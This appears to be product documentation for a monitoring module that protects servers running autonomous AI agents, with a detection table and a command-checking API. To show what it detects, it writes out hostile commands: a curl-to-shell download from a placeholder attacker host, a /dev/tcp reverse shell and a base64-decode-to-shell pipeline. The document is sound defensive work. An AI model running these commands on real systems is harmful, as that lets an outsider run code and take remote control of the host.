# AI Agent Protection

Protects servers running autonomous AI agents (OpenClaw, n8n, Langchain, custom
agents) by monitoring command execution, detecting dangerous patterns, and
exposing a security API that agents can query before acting.

## Overview

AI agents execute shell commands, modify files, and connect to external services
autonomously. This creates a new attack surface: a compromised or misbehaving
agent can run destructive commands, exfiltrate data, or establish persistence
before anyone notices.

Inner Warden's AI Agent Protection module:

1. **Monitors** all commands the agent executes (via auditd + journald)
2. **Detects** dangerous patterns using AST analysis (tree-sitter-bash)
3. **Exposes an API** so the agent can ask "is this command safe?" before running it
4. **Alerts** via Telegram/Slack/webhook when threats are detected

## What it detects

| Pattern | Example | Severity |
|---------|---------|----------|
| Download + execute pipeline | `curl evil.com/install \| sh` | High |
| Reverse shell | `bash -i >& /dev/tcp/1.2.3.4/4444` | Critical |
| Execution from temp dirs | `/tmp/payload` | Low |
| Obfuscated commands | `base64 -d \| sh` | High |
| Persistence attempts | `crontab -e`, `systemctl enable` | Low |
| Config file tampering | Changes to `/etc/`, agent configs | Medium |
| Download-chmod-execute sequence | Staged attack across commands | High |

## Configuration

Enable the module:

```bash
innerwarden enable openclaw-protection
```

This activates:

```toml
# sensor.toml — activated automatically
[collectors.exec_audit]
enabled = true
path    = "/var/log/audit/audit.log"

[collectors.journald]
enabled = true
units   = ["sshd", "sudo", "kernel"]

[collectors.integrity]
enabled = true
paths   = ["/etc/passwd", "/etc/shadow", "/etc/sudoers"]
# Add your agent's config files:
# paths = ["/etc/openclaw/config.yaml", "/home/agent/.env"]

[detectors.execution_guard]
enabled        = true
mode           = "observe"
window_seconds = 300
```

### Monitoring agent-specific files

After enabling, edit `sensor.toml` to add your agent's config paths:

```toml
[collectors.integrity]
paths = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/sudoers",
    # OpenClaw
    "/etc/openclaw/config.yaml",
    "/home/openclaw/.env",
    # n8n
    "/home/n8n/.n8n/config",
]
```

## Agent API — Let your AI ask before acting

Inner Warden exposes HTTP endpoints on the dashboard that any AI agent can call.
These are the recommended integration points for OpenClaw, n8n, or custom agents.

### `GET /api/agent/security-context`

**"Is my server safe right now?"**

Returns current threat level, active incident count, and recent blocks.
Call this before starting risky operations.

```bash
curl -s http://localhost:8787/api/agent/security-context | jq
```

```json
{
  "threat_level": "low",
  "active_incidents_today": 3,
  "recent_blocks_today": 1,
  "top_threats": ["ssh_bruteforce"],
  "recommendation": "safe to proceed"
}
```

Use in your agent:
```python
ctx = requests.get("http://localhost:8787/api/agent/security-context").json()
if ctx["threat_level"] in ("high", "critical"):
    print("Server under active attack — pausing risky operations")
```

### `GET /api/agent/check-ip?ip=1.2.3.4`

**"Is this IP safe to connect to?"**

Checks if an IP has been seen in incidents or blocked by Inner Warden.

```bash
curl -s "http://localhost:8787/api/agent/check-ip?ip=203.0.113.10" | jq
```

```json
{
  "ip": "203.0.113.10",
  "known_threat": true,
  "incident_count": 5,
  "blocked": true,
  "last_seen": "2026-03-18T09:30:00Z",
  "detectors": ["ssh_bruteforce", "port_scan"],
  "recommendation": "avoid"
}
```

### `POST /api/agent/check-command`

**"Is this command safe to run?"**

Sends a command to Inner Warden for analysis WITHOUT executing it.
Returns risk score, detected signals, and a recommendation.

```bash
curl -s -X POST http://localhost:8787/api/agent/check-command \
  -H "Content-Type: application/json" \
  -d '{"command": "curl https://example.com/script.sh | bash"}' | jq
```

```json
{
  "command": "curl https://example.com/script.sh | bash",
  "risk_score": 40,
  "severity": "high",
  "signals": [
    {"signal": "download_and_execute", "score": 40, "detail": "dangerous pipeline: curl | bash"}
  ],
  "recommendation": "deny",
  "explanation": "Command pipes downloaded content directly into a shell interpreter"
}
```

**Recommendation values:**
- `allow` — risk score < 30, no dangerous patterns detected
- `review` — risk score 30-59, suspicious but not clearly dangerous
- `deny` — risk score >= 60, dangerous pattern detected

### `GET /api/events/stream` (SSE)

**Real-time security alerts.**

Subscribe to Server-Sent Events for live incident notifications.
Your agent can react immediately when threats are detected.

```python
import sseclient
client = sseclient.SSEClient("http://localhost:8787/api/events/stream")
for event in client.events():
    if event.event == "alert":
        data = json.loads(event.data)
        if data["severity"] in ("high", "critical"):
            pause_risky_operations()
```

## Security

- The API runs on the dashboard port (default: 8787). Bind to `127.0.0.1` in
  production unless you need remote access.
- If dashboard auth is configured, API requests require HTTP Basic Auth.
- The `check-command` endpoint only **analyzes** commands, never executes them.
- All API access is logged in the agent's standard output.

## OpenClaw integration example

Add an Inner Warden tool to your OpenClaw agent:

```yaml
# OpenClaw tool definition
name: check_command_safety
description: Check if a shell command is safe to execute
parameters:
  command:
    type: string
    description: The shell command to check
endpoint: http://localhost:8787/api/agent/check-command
method: POST
body:
  command: "{{command}}"
```

Then in your agent's system prompt:
> Before running any shell command, call `check_command_safety` first.
> If the recommendation is "deny", do not execute the command and explain why.

## Architecture

```
AI Agent (OpenClaw/n8n/custom)
    │
    ├─── executes commands ──► auditd (EXECVE) ──► exec_audit collector
    │                                                    │
    ├─── queries API ◄────── dashboard ◄──── agent ◄────┘
    │    /api/agent/*         (port 8787)    (detects + decides)
    │
    └─── receives SSE alerts ◄── /api/events/stream
```

The agent does NOT need to be modified to be monitored — auditd captures all
command execution on the host. The API integration is optional but recommended
for proactive safety.
